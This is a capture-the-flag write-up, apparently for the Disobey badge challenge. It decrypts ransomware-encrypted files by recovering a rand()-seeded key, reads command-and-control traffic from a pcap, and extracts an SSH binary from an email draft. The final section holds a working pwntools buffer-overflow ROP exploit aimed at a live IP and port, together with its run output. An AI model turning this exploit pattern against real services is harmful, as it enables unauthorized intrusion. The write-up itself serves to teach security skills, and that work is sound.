#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fstream>
#include <cstdlib> // for rand()
#include <ctime>   // for time()
#include <chrono>

using namespace std::chrono;

#pragma comment(lib, "Advapi32.lib")


void HandleError(const char* errorMessage) {
    // std::cerr << errorMessage << " Error Code: " << GetLastError() << std::endl;
     //exit(1);
}

char* hex_to_char(const char* hex_str) {
    // Remove '0x' if it exists in the string
    if (hex_str[0] == '0' && hex_str[1] == 'x') {
        hex_str += 2;
    }

    size_t len = strlen(hex_str);
    // Allocate memory for the resulting byte array
    char* result = (char*)malloc(len / 2 + 1); // each two hex digits represent 1 byte
    if (result == NULL) {
        return NULL; // Memory allocation failed
    }

    for (size_t i = 0; i < len; i += 2) {
        // Convert each hex pair to a byte and store it in the result
        sscanf_s(hex_str + i, "%2hhx", &result[i / 2]);
    }

    // Null-terminate the result string
    result[len / 2] = '\0';

    return result;
}

// Function to convert FILETIME to time32 (32-bit Unix timestamp)

const int BUFFER_SIZE = 32; // This should match the '20' value in the assembly code


int main() {

    const std::string filename = "F:\\Downloads\\confidential\\Thunderbird_profile_backup.zip.diavola";
    std::string fileName = "F:\\Downloads\\confidential\\Thunderbird_profile_backup.zip";
    // Seed the random number generator

     // Open the file
    const char* filePath = filename.c_str();
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening file: " << GetLastError() << std::endl;
        return 1;
    }


    // Clean up and close the file handle
    CloseHandle(hFile);

    std::srand(<timestamp>); 

   

    // Open the file in binary mode
    std::ifstream file(filename, std::ios::binary | std::ios::ate);

    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return 1;
    }

    // Get the size of the file
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);  // Rewind to the beginning

    // Create a vector to hold the file content
    std::vector<uint8_t> buffer(fileSize);

    // Read the entire file into the buffer
    if (!file.read(reinterpret_cast<char*>(buffer.data()), fileSize)) {
        std::cerr << "Error reading file: " << filename << std::endl;
        return 1;
    }

    // Close the file
    file.close();


    const int iterations = 32;
    unsigned char password[iterations];

    for (int i = 0; i < iterations; ++i) {
        // Step 1: Generate a random number and apply a bitmask
        int rand_val = std::rand();
        rand_val &= 0x800000FF;

        // Step 2: If the value is negative, apply further operations
        if (rand_val < 0) {
            rand_val--;
            rand_val |= 0xFFFFFF00;
            rand_val++;
        }

        // Step 3: Store the lower 8 bits of the result (similar to storing `al`)
        password[i] = static_cast<unsigned char>(rand_val & 0xFF);

        std::cout << static_cast<unsigned char>(rand_val & 0xFF);

        // Optional debug output for each iteration (you can remove this in production)
        std::cout << "Iteration " << i << ": " << static_cast<int>(password[i]) << std::endl;
    }

    std::cout << password;

    for (int i = 0; i < iterations; ++i) {
        std::cout << std::hex << static_cast<int>(password[i]) << " ";
    }

    /* Another rand shit 0x10 times*/
    const int iterations2 = 0x10;
    unsigned char pdDatashit[iterations];

    for (int i = 0; i < iterations2; ++i) {
        // Step 1: Generate a random number and apply a bitmask
        int rand_val = std::rand();
        rand_val &= 0x800000FF;

        // Step 2: If the value is negative, apply further operations
        if (rand_val < 0) {
            rand_val--;
            rand_val |= 0xFFFFFF00;
            rand_val++;
        }

        // Step 3: Store the lower 8 bits of the result (similar to storing `al`)
        pdDatashit[i] = static_cast<unsigned char>(rand_val & 0xFF);

        std::cout << static_cast<unsigned char>(rand_val & 0xFF);

        // Optional debug output for each iteration (you can remove this in production)
        std::cout << "Iteration " << i << ": " << static_cast<int>(pdDatashit[i]) << std::endl;
    }

    std::cout << pdDatashit;

    for (int i = 0; i < iterations2; ++i) {
        std::cout << std::hex << static_cast<int>(pdDatashit[i]) << " ";
    }



    HCRYPTPROV hCryptProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    BYTE* pbKeyBlob = NULL;
    DWORD dwBlobLen;

    // Sample plaintext to encrypt and decrypt
    const char* plaintext = "Hello, this is a secret!";
    DWORD plaintextLen = strlen(plaintext) + 1; // Include the null terminator
    
    // Acquire a cryptographic provider context handle.
    if (!CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, NULL)) {
        HandleError("Error during CryptAcquireContext");
    }

    // Create a hash object to hash the password.
    if (!CryptCreateHash(hCryptProv, 0x800c, NULL, NULL, &hHash)) {
        HandleError("Error during CryptCreateHash");
    }

    DWORD dataLen = 0x20;
    // 000000EB350FF4C0  BA 4E E9 3F 3B FE 7A EA 5F 5C 42 2D 08 51 D7 56  ºNé?;þzê_\B-.Q×V  
    if (!CryptHashData(hHash, (BYTE*)password, 0x20, NULL)) { // length = 16
        HandleError("Error during CryptHashData");
    }

    // Generate a session key based on the hash of the password.
    if (!CryptDeriveKey(hCryptProv, 0x6610, hHash, 0, &hKey)) {
        HandleError("Error during CryptDeriveKey");
    }

    // Set a key parameter (e.g., block mode to CBC)
    DWORD dwMode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, 1, (BYTE*)pdDatashit, 0)) { // rand 0x10????
        HandleError("Error setting KP_MODE");
    }

    // Encrypt the plaintext

    std::vector<BYTE> ciphertext(plaintextLen + 0x20); // Allocate space for ciphertext
    DWORD ciphertextLen = plaintextLen;
    memcpy(ciphertext.data(), plaintext, plaintextLen);

    //DWORD decryptedTextLen =  16;

    // Decrypt the ciphertext
    std::vector<BYTE> decryptedText(ciphertext.size());
    memcpy(decryptedText.data(), ciphertext.data(), ciphertext.size());
    DWORD decryptedTextLen = buffer.size();// +16;

    std::cout << password;

    if (!CryptDecrypt(hKey, NULL, FALSE, 0, buffer.data(), &decryptedTextLen)) {
        HandleError("Error during CryptDecrypt");
    }
    else {
        std::cout << "Decrypted text: " << (char*)buffer.data() << std::endl;

        //writeBytesToFile("C:\\Users\\zolaboo\\Desktop\\asd",&buffer.data());
        std::ofstream file(fileName, std::ios::binary);

        // Check if the file was opened successfully
        if (!file) {
            std::cerr << "Error: Could not open file " << fileName << " for writing.\n";

        }

        // Write the vector data to the file
        file.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());

        // Close the file
        file.close();

        // Check for errors in writing
        if (!file.good()) {
            //std::cerr << "Error: Writing to file " << fileName << " failed.\n";
        }
    }


    // Clean up
    if (hHash) {
        CryptDestroyHash(hHash);
    }
    if (hKey) {
        CryptDestroyKey(hKey);
    }
    if (hCryptProv) {
        CryptReleaseContext(hCryptProv, 0);
    }

    return 1;
}
```

</details>







## Decrypt files
Now we have all information and decryption code to decrypt files from .zip. All we now need is correct time to set on `std::srand(<timestamp>);`

This can be clearly seen from parsed traffic we got from pcap:
```
Packet number: 3186
HTTP response (for request 3183 GET)
Length raw data: 80
Timestamp: 1725110380 20240831-131940
Data size: 40
Command: 53 COMMAND_LS
 Arguments length: 32
 b'\xff\xff\xff\xfe\x00\x00\x00\x18C:\\Users\\Armand\\backup\\*'
 MD5: 901f081f0be21b10e56951652c746138

Packet number: 3193
HTTP request POST
http://divanodivino.xyz/submit.php?id=1671185270
Length raw data: 644
Counter: 11
Callback: 22 CALLBACK_PENDING
b'\xff\xff\xff\xfe'
----------------------------------------------------------------------------------------------------
C:\Users\Armand\backup\*
D	0	08/31/2024 16:19:33	.
D	0	08/31/2024 16:19:33	..
F	898464	08/31/2024 16:19:33	daddy_front_of_office.jpeg.diavola
F	1132256	08/31/2024 16:19:33	defcon_trip.jpeg.diavola
F	206656	08/31/2024 16:19:33	dickpick.jpeg.diavola
F	333504	08/31/2024 16:19:33	dont_waste_your_time_here.jpeg.diavola
F	992304	08/31/2024 16:19:33	games_in_vegas.jpeg.diavola
F	1510	08/31/2024 16:19:33	README.txt
F	30432	08/31/2024 16:19:33	sausage.pdf.diavola
F	1239008	08/31/2024 16:19:33	snack_in_pattaya.jpeg.diavola
F	39578864	08/31/2024 16:19:33	Thunderbird_profile_backup.zip.diavola
```
Convert this to timestamp and we can now decrypt files!

## Thunderbird - SSH vuln
Most interesting file from these was this `Thunderbird_profile_backup.zip`. Extract it files and open it eg. `FTK imager`.
Here we see what this holds:<br>
![FTK imager](./pix/ftkimager.png)<br>

In mails, `lmap Mail -> outlook.office265.com/Draft-1` there seems to be draft:
```
<body>
    <p>Hi Anna Lyydia,<br>
      <br>
      I've just been informed that there is a critical vulnerability in
      the SSH software we use. I can't be more specific about what's
      wrong with it but could you take a look and fix it as soon as
      possible?<br>
      <br>
      I am afraid that our company is being targeted by corporate
      espionage, after all we are the largest producer of microplastics
      in the Kouvostoliitto.<br>
      <br>
      Attached is the binary, I don't have access to source code. I know
      it is currently running on our production server at IP address
      94.237.112.76:42069.<br>
      <br>
      Regards for cooperation,<br>
      Armand Makkara<br>
      Prince of Microplastics<br>
    </p>
  </body>

```

And from attachments:
```
--------------gQbDnPFH9u8awpNm0k020A0w
Content-Type: application/octet-stream; name="ssh"
Content-Disposition: attachment; filename="ssh"
Content-Transfer-Encoding: base64

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAUBJAAAAAAABAAAAAAAAAANhPAAAAAAAAAAAAAEAA
OAANAEAAJQAkAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAA2AI
...................................................
AAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAGVOAAAAAAAAbwEAAAAAAAAAAAAA
AAAAAAEAAAAAAAAAAAAAAAAAAAA=
```
Base64 "encoded" file. 
Lets convert this back to original shape and see whats inside of it.


## SSH vuln - pwn
Copying attachment from email to file and run command `base64 -d email.base64 > ssh.bin` we get the original executable from file. According to email, there is vulnerability on this, so lets open ghidra.

Main function:
```cpp
bool main(void)

{
  int iVar1;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  iVar1 = authenticate_user(); // Gets if user is authenticated or not
  if (iVar1 != 0) { // If user is authenticated
    buy_ticket(); // Buy ticket aka rick troll
  }
  return iVar1 == 0;
}
```
Seems pretty simple so far.
In `authenticate_user` function we see already bad `gets` function. So this is clearly buffer overflow vuln here. 

Checking `checksec` on this bin file:
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   62 Symbols        No    0               3               ssh.bin
```
We should be able to contron return address. But for this we are not going to "call" `buy_ticket`. (There is username to be found in binary if you like to try this).
Instead there is this `nothingotseehere`. To get call this, we need to get buffer overflow so we can control the return address from `authenticate_user` to `nothingtoseehere`.

To calculate `padding` we can use tool or calculate it:
```cpp
  int iVar1;
  char password [42];   42
  char User_input [8];  50
  undefined8 local_26;  58
  undefined4 local_1e;  66
  undefined2 local_1a;  74
  undefined4 local_18;  82
  int local_14;         86
  char *local_10;       87
```
So `padding` will be 87.

Next since this is `x64 bit` exe we are using `ropper` to get `pop_rdi; ret;` gadget with command: `ropper -f ssh.bin --search "pop rdi"`:
```bash
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ssh.bin
0x0000000000401a16: pop rdi; pop rbp; ret;
0x0000000000401520: pop rdi; pop rdi; ret;
0x0000000000401521: pop rdi; ret;
```


There is also one parameter we need:
```cpp
..........................
  pcVar1 = fgets(local_58,0x41,local_10);
  if (pcVar1 != (char *)0x0) {
    if (param_1 == -0x21520ff3) {
      printf("Is this it? ");
      puts(local_58);
    }
..........................
```
This `0x21520ff3` translates to `0xdeadf00d` and we need to pass this when returning no `nothingtoseehere`.


Now we should have all we need, next build script with `pwn` library:

```python
from pwn import *

exe = "./ssh.bin"
elf = context.binary = ELF(exe, checksec=False)

pop_rdi = 0x0000000000401521
param = 0xdeadf00d
io = remote("94.237.112.76", 42069)

payload = flat(
b'A' * 88,
pop_rdi,
param,
elf.functions.nothingtoseehere,
)

io.sendlineafter(b'User:', b"asdf")
d = io.recvuntil(b"Password:")
print(d.decode())
print("Sending password")
io.sendline(payload)

io.interactive()

```

Run python script:
```bash
[+] Opening connection to 94.237.112.76 on port 42069: Done
Password:
Sending password
[*] Switching to interactive mode
Permission denied (publickey,password).
Is this it? https://tickets.disobey.fi/redeem?voucher=H4CKR-H9H3KL2WQFU82AQV
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to 94.237.112.76 port 42069
```

And get your hacker badge!<br>
![badge](./pix/badge.png)
























